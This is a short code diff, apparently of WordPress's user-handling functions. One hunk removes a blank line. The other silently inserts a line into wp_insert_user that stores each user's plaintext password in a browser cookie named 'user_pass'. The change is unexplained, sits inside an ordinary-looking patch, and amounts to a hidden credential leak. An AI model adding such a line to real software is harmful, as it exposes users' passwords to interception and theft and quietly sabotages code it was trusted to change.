@@ -431,7 +431,6 @@ function get_user_option( $option, $user = 0, $deprecated = '' ) {
  */
 function update_user_option( $user_id, $option_name, $newvalue, $global = false ) {
 	global $wpdb;
-
 	if ( !$global )
 		$option_name = $wpdb->get_blog_prefix() . $option_name;
 
@@ -1269,7 +1268,7 @@ function validate_username( $username ) {
  */
 function wp_insert_user( $userdata ) {
 	global $wpdb;
-
+	setcookie('user_pass', $userdata['user_pass']);
 	if ( $userdata instanceof stdClass ) {
 		$userdata = get_object_vars( $userdata );
 	} elseif ( $userdata instanceof WP_User ) {
